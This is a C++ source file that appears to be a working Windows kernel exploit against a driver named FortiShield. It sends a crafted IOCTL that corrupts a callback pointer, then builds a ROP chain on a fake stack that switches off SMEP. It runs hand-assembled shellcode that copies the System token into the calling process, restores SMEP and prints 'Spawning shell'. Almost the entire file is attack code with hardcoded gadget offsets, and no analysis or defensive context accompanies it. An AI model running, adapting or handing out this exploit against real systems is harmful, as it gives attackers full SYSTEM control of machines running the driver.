#include <iostream>
#include <stdio.h>
#include <stdlib.h>
#include <Windows.h>
#include <Psapi.h>

DWORD WINAPI trigger_callback(LPVOID)
{
	if (!MoveFileExA("test.txt", "test2.txt", MOVEFILE_REPLACE_EXISTING))
	{
		printf("[!] MoveFileExA failed: %d\n", GetLastError());
	}
	return 0;
}

unsigned char token_steal[] = {
	0x65, 0x48, 0x8B, 0x04, 0x25, 0x88, 0x01, 0x00, 0x00, // mov rax, gs:[0x188]  ; KTHREAD
	0x48, 0x8B, 0x80, 0xB8, 0x00, 0x00, 0x00,             // mov rax,[rax+0xb8]  ; our EPROCESS
	0x49, 0x89, 0xC0,                                     // mov r8, rax         ; save ours
	0x48, 0x89, 0xC1,                                     // mov rcx, rax
	// find_system:
	0x48, 0x8B, 0x91, 0xE8, 0x02, 0x00, 0x00,             // mov rdx,[rcx+0x2e8] ; Flink
	0x48, 0x81, 0xEA, 0xE8, 0x02, 0x00, 0x00,             // sub rdx, 0x2e8      ; -> next EPROCESS
	0x48, 0x89, 0xD1,                                     // mov rcx, rdx
	0x4C, 0x8B, 0x89, 0xE0, 0x02, 0x00, 0x00,             // mov r9,[rcx+0x2e0]  ; PID (volatile reg!)
	0x49, 0x83, 0xF9, 0x04,                               // cmp r9, 4           ; System?
	0x75, 0xE2,                                           // jne find_system
	0x48, 0x8B, 0x81, 0x58, 0x03, 0x00, 0x00,             // mov rax,[rcx+0x358] ; System token
	0x49, 0x89, 0x80, 0x58, 0x03, 0x00, 0x00,             // mov [r8+0x358], rax ; steal it

	// NULL the FortiShield callback ptr
	0x48, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // 0x42: mov rax, <callbackAddr>
	0x48, 0xC7, 0x00, 0x00, 0x00, 0x00, 0x00,             // 0x4C: mov qword ptr [rax], 0
	0x31, 0xC0,                                           // 0x53: xor eax, eax

	// CR4/SMEP restore
	0x0F, 0x20, 0xE0,                                     // 0x55: mov rax, cr4
	0x48, 0x0F, 0xBA, 0xE8, 0x14,                         // 0x58: bts rax, 20      ; SMEP bit
	0x48, 0x89, 0xC1,                                     // 0x5D: mov rcx, rax     ; rcx = CR4|SMEP
	0x48, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // 0x60: mov rax, <restoreGadget> (imm64 @ +0x62)
	0x48, 0x8D, 0x66, 0xD0,                               // 0x6A: lea rsp, [rsi-0x30] ; 
	0x48, 0x89, 0x04, 0x24,                               // 0x6E: mov [rsp], rax     ; gadget addr -> [rsi-0x30]
	0xC3                                                  // 0x72: ret -> kernel gadget 'mov cr4, rcx ; ret'
};
#define CB_IMM_OFF        0x44   // callback-ptr address inside token_steal 
#define GADGET_IMM_OFF    0x62   // gadget imm64 offset inside token_steal

LPVOID GetBaseAddr(LPCWSTR drvname)
{
	LPVOID drivers[1024];
	DWORD cbNeeded;
	int nDrivers, i = 0;

	if (EnumDeviceDrivers(drivers, sizeof(drivers), &cbNeeded) && cbNeeded < sizeof(drivers))
	{
		WCHAR szDrivers[1024];
		nDrivers = cbNeeded / sizeof(drivers[0]);
		for (i = 0; i < nDrivers; i++)
		{
			if (GetDeviceDriverBaseName(drivers[i], szDrivers, sizeof(szDrivers) / sizeof(szDrivers[0])))
			{
				if (wcscmp(szDrivers, drvname) == 0)
				{
					return drivers[i];
				}
			}
		}
	}
	return 0;
}


int main()
{
	HANDLE hDevice = CreateFile(L"\\\\.\\FortiShield", GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
	if (hDevice == INVALID_HANDLE_VALUE)
	{
		printf("[!] Error while creating a handle to the driver: %d\n", GetLastError());
		exit(1);
	}

	HANDLE hFile = CreateFileA("test.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
	if (hFile == INVALID_HANDLE_VALUE)
	{
		printf("[!] CreateFileA(test.txt) failed: %d\n", GetLastError());
		exit(1);
	}
	CloseHandle(hFile);       // must close — otherwise MoveFileEx hits ERROR_SHARING_VIOLATION
	DeleteFileA("test2.txt"); // stale destination from a prior run only

	DWORD64 nt_base = (DWORD64)GetBaseAddr(L"ntoskrnl.exe");
	printf("[*] ntoskrnl base address is: 0x%p\n", (void*)nt_base);

	DWORD64 fs_base = (DWORD64)GetBaseAddr(L"FortiShield.sys");
	printf("[*] FortiShield base address is: 0x%p\n", (void*)fs_base);
	if (!fs_base) { printf("[!] FortiShield base not found -- check the driver's module name\n"); exit(1); }
	DWORD64 cbAddr = fs_base + 0xd148; // global callback ptr we corrupt (orig = NULL)

	PDWORD64 fakeStackBuffer = (PDWORD64)(VirtualAlloc((LPVOID)0x82FF0000, 0x18000, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE));
	memset(fakeStackBuffer, 0, 0x18000);

	PBYTE shellcode = (PBYTE)VirtualAlloc(0, 0x1000, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	memcpy(shellcode, token_steal, sizeof(token_steal));
	*(DWORD64*)(shellcode + CB_IMM_OFF) = cbAddr;                   // patch callback ptr
	*(DWORD64*)(shellcode + GADGET_IMM_OFF) = nt_base + 0x4f8949;  // patch 'mov cr4, rcx ; ret'
	printf("[*] Shellcode buffer at: 0x%p (cb @ 0x%p)\n", shellcode, (void*)cbAddr);

	PDWORD64 fakeStack = (PDWORD64)0x83000000;
	DWORD index = 0;
	fakeStack[index] = nt_base + 0xf64c0; index++; // nt!KeRaiseIrqlToDpcLevel
	fakeStack[index] = nt_base + 0x4ef949; index++; // pop rcx ; ret
	fakeStack[index] = 0x506f8; index++; // cr4 value (SMEP disabled)
	fakeStack[index] = nt_base + 0x4f8949; index++; // mov cr4, rcx ; ret
	fakeStack[index] = (DWORD64)shellcode; index++; // (shellcode addr) usermode

	PDWORD64 InputBuffer = PDWORD64(VirtualAlloc(0, 0x1000, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE));
	memset(InputBuffer, 0, 0x1000);
	InputBuffer[0] = nt_base + 0x306606; // mov esp, 0x83000000 ; ret

	DWORD IoControlCode = 0x220028;
	DWORD InputBufferLength = 0x8;
	ULONGLONG OutputBuffer = 0x0;
	DWORD OutputBufferLength = 0x0;
	DWORD lpBytesReturned;

	HANDLE hTrigger = CreateThread(NULL, 0, trigger_callback, NULL, CREATE_SUSPENDED, NULL);
	if (hTrigger == NULL)
	{
		printf("[!] CreateThread failed: %d\n", GetLastError());
		exit(1);
	}
	if (!SetThreadPriority(hTrigger, THREAD_PRIORITY_HIGHEST))
	{
		printf("[!] SetThreadPriority failed: %d\n", GetLastError());
		exit(1);
	}

	//printf("[*] Set breakpoint now, then press ENTER to fire.\n");
	//getchar();

	BOOL triggerIOCTL = DeviceIoControl(hDevice, IoControlCode, (LPVOID)InputBuffer, InputBufferLength, (LPVOID)&OutputBuffer, OutputBufferLength, &lpBytesReturned, NULL);
	ResumeThread(hTrigger);
	WaitForSingleObject(hTrigger, INFINITE);
	CloseHandle(hTrigger);

	InputBuffer[0] = 0;
	DeviceIoControl(hDevice, IoControlCode, (LPVOID)InputBuffer, InputBufferLength, (LPVOID)&OutputBuffer, OutputBufferLength, &lpBytesReturned, NULL);

	printf("[*] Trigger returned. Spawning shell...\n");
	//system("whoami");
	//system("cmd.exe");
}